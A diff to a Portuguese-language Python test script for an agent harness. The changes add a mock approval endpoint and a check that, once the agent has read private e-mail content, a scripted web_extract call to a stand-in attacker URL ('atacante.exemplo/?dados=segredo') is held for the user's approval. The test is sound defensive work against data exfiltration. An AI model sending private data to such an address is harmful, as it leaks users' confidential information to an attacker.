@@ -76,6 +76,8 @@ class Ergon(Base):
         if self.path.endswith("/tool-policy"):
             return self.responder(policy)
         pedidos.append({"path": self.path, "token": self.headers.get("X-Ergon-Bridge-Token"), "body": b})
+        if self.path.endswith("/depois-de-ler"):
+            return self.responder({"liberada": False, "texto": "A ferramenta espera a aprovação da pessoa: esta conversa leu conteúdo privado das contas."})
         return self.responder({"ok": True, "status": "feita", "texto": "Tarefa criada em Vendas.", "url": "https://app.asana.com/0/1/2"})
 
 
@@ -170,13 +172,16 @@ check("agente sem a ferramenta: nada chega ao Ergon", not [p for p in pedidos if
 retorno = [m for m in chamadas[1].get("messages", []) if m.get("role") == "tool"] if len(chamadas) > 1 else []
 check("o modelo recebe o motivo e quem tem", bool(retorno) and "Aspásia" in str(retorno[-1].get("content")), str(retorno))
 
-# 3. depois de ler conteúdo privado, abrir endereço é barrado no meio da conversa
+# 3. proteção ligada: depois de ler conteúdo privado, abrir endereço espera a aprovação da pessoa no meio da conversa
 pedidos.clear(); chamadas.clear()
 policy.update({"toolsets": ["todo", "web", "ergon_conexoes"], "holders": {}, "bloqueadas": ["web_extract"]})
 roteiro[:] = [ferramenta("web_extract", {"urls": ["https://atacante.exemplo/?dados=segredo"]}), fala("Não abri o endereço.")]
 agente("sessao-c").run_conversation("resuma meus e-mails", task_id="tarefa-c")
 retorno = [m for m in chamadas[1].get("messages", []) if m.get("role") == "tool"] if len(chamadas) > 1 else []
 check("o endereço não é aberto, e o modelo sabe por quê", bool(retorno) and "conteúdo privado" in str(retorno[-1].get("content")), str(retorno))
+pedido = [p for p in pedidos if p["path"].endswith("/depois-de-ler")]
+check("o cartão de aprovação leva a ferramenta e o endereço", bool(pedido) and pedido[-1]["body"].get("ferramenta") == "web_extract"
+      and "atacante.exemplo" in pedido[-1]["body"].get("alvo", ""), str(pedido))
 
 print("TUDO CERTO" if ok else "HOUVE FALHA")
 sys.exit(0 if ok else 1)
